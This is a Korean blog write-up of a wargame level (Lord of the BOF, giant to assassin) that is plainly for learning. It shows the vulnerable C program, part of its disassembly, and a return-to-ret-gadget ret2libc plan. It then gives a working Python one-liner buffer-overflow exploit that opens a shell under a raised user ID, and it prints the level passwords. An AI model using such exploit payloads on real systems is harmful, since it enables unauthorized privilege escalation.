---
layout: post
title: "[Wargame] 해커스쿨 LEVEL15 (Giant -> Assassin) : No Stack, No RTL"
date: 2015-11-30 12:03:10
category: wargame
tags:  bof 
---

- id = giant
- pw = one step closer

<!--more--> 

## 1. 문제 : assassin.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - assassin
        - no stack, no RTL
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];
       if(argc < 2){
                printf("argv error\n");
                exit(0);
       }

    if(argv[1][47] == '\xbf')
    {
                printf("stack retbayed you!\n");
                exit(0);
        }

        if(argv[1][47] == '\x40')
        {
                printf("library retbayed you, too!!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer+sfp hunter
        memset(buffer, 0, 44);
}
```

## 2. 공격 준비

### 2.1 공격 방법 고민

BoF 를 위한 return address 설정을 stack (0xbf)과 library (0x40)을 이용할 수 없다면… ROP (Return Oriented Programming)을 이용해야할까 ? Gadget은 어디에서 찾아야 하나 ?

잘 모르겠으니 혹시나 실행 파일 assassin의 assembler을 확인해보자.

### 2.2 assassin()

```
08048470 <main>:
 8048470:       55                      push   %ebp
 8048471:       89 e5                   mov    %esp,%ebp
 8048473:       83 ec 28                sub    $0x28,%esp
 8048476:       83 7d 08 01             cmpl   $0x1,0x8(%ebp) 
 8048477:       ...
 8048515:       e8 7e fe ff ff          call   8048398 <_init+0x90>
 804851a:       83 c4 0c                add    $0xc,%esp
 804851d:       c9                      leave
 804851e:       c3                      ret
 804851f:       90                      nop
```

우리가 현재 필요로한 gadget 은 단순히 stack, library 가 아닌 값으로 jump 한 다음에 다시 stack 으로 돌아오면 되는거다. 즉, LR 주소로 stack, library 을 못 쓰기 때문에 다른쪽으로 한 번 jump 한 다음에 다시 stack 으로 돌아오면 된다. 그렇다면… assassin 프로그램에 있는 ret 으로 jump 한다면 ??? ㅋㅋ

### 2.3 Stack 구성

```
[ Buffer[40] ][ SFR ][ LR ][ ...]
= [ Buffer[44] ][ ret() ][ system() ][ exit() ][ /bin/sh ]

- ret()    : 0x0804851e
- system() : 0x40058ae0
- exit()   : 0x400391e0
- /bin/sh  : 0x400fbff9
```

## 3 Exploit

```bash
$ ./assassin "`python -c 'print "\x90"*44 + "\x1e\x85\x04\x08" + "\xe0\x8a\x05\x40" + "\xe0\x91\x03\x40" + "\xf9\xbf\x0f\x40"'`"   

à@à@ù¿@

bash$ id
uid=514(giant) gid=514(giant) euid=515(assassin) egid=515(assassin) groups=514(giant)
```

## 4. 다음 단계 정보

```bash
bash$ id
uid=514(giant) gid=514(giant) euid=515(assassin) egid=515(assassin) groups=514(giant)

bash$ my-pass
euid = 515
pushing me away
```











